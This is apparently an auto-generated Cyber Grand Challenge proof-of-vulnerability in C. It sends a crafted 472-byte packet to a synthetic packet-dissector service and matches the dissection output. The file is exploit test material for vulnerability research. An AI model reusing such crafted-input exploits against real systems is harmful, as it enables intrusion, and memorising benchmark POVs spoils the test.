#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd8\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xc0\x01\x00\x00\xb8\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb8\x01\x00\x00"
         "\x96\x7b\x12\xe5\x26\x96\xe0\x2b\x82\x22\x38\x3f\xea\xa2\x86\x41"
         "\x4a\xeb\x2b\x8f\x40\x00\x00\x00\xff\x41\x00\x19\x5e\x32\x60\xa3"
         "\x6c\x74\x82\xbe\x80\x2d\x40\x9e\x2a\x84\x0a\x01\x00\xce\xa1\xaf"
         "\xc4\x81\xb3\x17\x47\x84\x94\x54\xff\xff\x01\x8a\x01\xd3\x8e\x58"
         "\x32\x09\x25\xbd\xac\x31\x6c\x2c\x84\x2a\x5d\xf4\x8c\x60\xd0\x3f"
         "\x0b\x7f\x01\x00\x0f\x84\xac\x5e\x15\x01\x90\x07\x01\x04\xc0\x06"
         "\x36\x87\xa1\x46\xd3\x4e\xbc\x88\x1d\xd7\x29\x34\x64\x98\x01\x51"
         "\xcc\xed\x7f\x3f\xcd\xcc\x35\x2f\xc7\x6d\xd0\xb6\x69\x6d\x0b\xac"
         "\xce\x4c\xc7\xcf\xff\xff\xff\xff\xc5\x0f\xb7\x32\x25\x16\x51\xb3"
         "\x76\x86\x29\x1f\x5d\xff\xff\xff\x63\x16\x03\xf7\x44\xde\x9f\x66"
         "\x41\x00\x01\x00\x06\x05\x6b\xc9\x91\x44\x37\xfd\x24\x5d\x01\x04"
         "\x00\xb6\x85\x12\x01\x00\xad\x28\xff\x75\xd6\x99\x05\x29\x35\x5c"
         "\xba\xd8\x47\xf7\xe7\x6e\x0f\xf6\x32\x5d\x85\x7e\xdb\xcb\x4f\x9c"
         "\x5e\x7e\xc5\xe8\xe0\x6d\x69\xfd\x9d\x17\xfa\x2f\x52\xc1\x44\xb4"
         "\x5c\x5c\x40\x3b\xc8\xdb\x6e\xdf\x9c\x12\xaf\x04\xc7\x14\xf3\x28"
         "\x39\x1b\xfc\x04\x37\xbc\x3b\x1a\x38\x33\x2f\xad\xd2\xd0\x80\x18"
         "\x4b\xea\x29\x08\x82\x49\x4f\x48\x43\xfa\x7e\xa9\x3a\x42\x6a\x6e"
         "\xcb\x1c\x59\xd7\x37\xbb\x61\x6b\xb5\xb0\x94\xcc\xd9\xfd\x73\x00"
         "\x17\x7e\x67\x21\x6a\xfc\xe9\xdc\xa3\x59\xc8\xec\x31\x54\x3b\x2f"
         "\xf8\x7d\x77\x96\x7d\x81\xd9\x60\x86\x34\xa0\x1f\x45\x56\xe5\xc2"
         "\x99\xc2\x58\xc4\x3b\xd3\x12\xd8\x8c\xcb\x50\x62\xdd\x2b\x63\xb4"
         "\x62\x61\xe1\x46\x92\x1c\x5f\x0d\x15\x8c\xff\x55\x3f\x52\x4f\x9d"
         "\x58\x7d\x2a\xed\x07\xf9\xdb\x8b\x73\x4a\x25\x1e\x7d\xcd\x8a\xdb"
         "\xc6\x58\x00\x20\x4e\x97\xef\x5d\xf0\xc5\xf8\xd6\xd7\x7b\xa9\x82"
         "\x44\x1c\x7c\x3d\x59\x3e\x47\x77\x85\x0c\xa0\x44\xc5\xd4\x4b\x48"
         "\x54\x61\x08\xcf\x3b\xc2\x1c\x5e\x5f\xae\x92\xf2\x58\x46\xfe\x5c"
         "\xc2\x4d\x32\x00\x2b\xab\xef\xc3\x05\x0d\x73\x6e\x0c\xc7\x31\xa2"
         "\xe1\x4a\x34\xf1\xab\xa0\xc0\x14";
      static unsigned int write_00001_00000_len = 472;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasquatinid
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x71\x75\x61\x74\x69"
         "\x6e\x69\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
